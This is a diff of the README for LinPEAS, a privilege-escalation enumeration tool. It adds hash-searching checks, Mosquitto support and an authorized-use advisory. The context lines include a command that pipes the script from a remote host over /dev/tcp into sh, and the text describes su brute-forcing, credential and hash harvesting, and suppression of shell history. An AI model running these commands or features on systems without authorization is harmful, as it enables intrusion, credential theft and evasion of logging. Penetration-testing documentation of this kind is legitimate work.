@@ -25,9 +25,6 @@ nc -q 5 -lvnp 80 < linpeas.sh
 cat < /dev/tcp/10.10.10.10/80 | sh
 ```
 
-## IMPORTANT CHANGE
-**For satisfying most users and thanks to the incorporation of the 2000pwds/user su bruteforce, the default behaviour of linpeas has been changed to fast/stealth (no writting to disk, no 1min processes check, and no su BF).**
-
 **Use the parameter `-a` to execute all these checks.**
 
 ## Basic Information
@@ -47,12 +44,12 @@ By default linpeas takes around **1 min** to complete, but It could take from **
 - 1 min to monitor the processes in order to find very frequent cron jobs *(need `-a`)* - Notice that this check will need to **write** some info inside a file that will be deleted
 
 **Other parameters:**
-- **-a** (all checks) - This will **execute also the check of processes during 1 min, and brute-force each user using `su` with the top2000 passwords.**
+- **-a** (all checks) - This will **execute also the check of processes during 1 min, will search more possible hashes inside files, and brute-force each user using `su` with the top2000 passwords.**
 - **-s** (superfast & stealth) - This will bypass some time consuming checks - **Stealth mode** (Nothing will be written to disk)
 
 This script has **several lists** included inside of it to be able to **color the results** in order to highlight PE vector.
 
-LinPEAS also **exports a new PATH** variable if common folders aren't present in the original PATH variable. It also **exports and unset** some environmental variables so no command executed during the session will be saved in the history file (you can avoid this actions using the parameter **-n**).
+LinPEAS also **exports a new PATH** variable during the execution if common folders aren't present in the original PATH variable. It also **exports and unset** some environmental variables during the execution so no command executed during the session will be saved in the history file (you can avoid this actions using the parameter **-n**).
 
 ![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/help.png)
 
@@ -212,6 +209,7 @@ file="/tmp/linPE";RED='\033[0;31m';Y='\033[0;33m';B='\033[0;34m';NC='\033[0m';rm
   - [x] Couchdb
   - [x] Redis
   - [x] Dovecot
+  - [x] Mosquitto
 
 
 - **Generic Interesting Files**
@@ -238,6 +236,8 @@ file="/tmp/linPE";RED='\033[0;31m';Y='\033[0;33m';B='\033[0;34m';NC='\033[0m';rm
   - [x] Get IPs, passwords and emails from logs
   - [x] password or credential files in home
   - [x] "pwd" and "passw" inside files (and get most probable lines)
+  - [x] Specific hashes (blowfish, joomla&vbulletin, phpbb3, wp, drupal, linuxmd5, apr1md5, sha512crypt, apachesha)
+  - [x] Generic hashes MD5, SHA1, SHA256, SHA512
 </details>
 
 ## Do not fork it!!
@@ -265,6 +265,10 @@ If you find any issue, please report it using **[github issues](https://github.c
 
 
 **Linpeas** is being **updated** every time I find something that could be useful to escalate privileges.
+
+## Advisory
+
+All the scripts/binaries of the PEAS Suite should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
 
 ## License
 
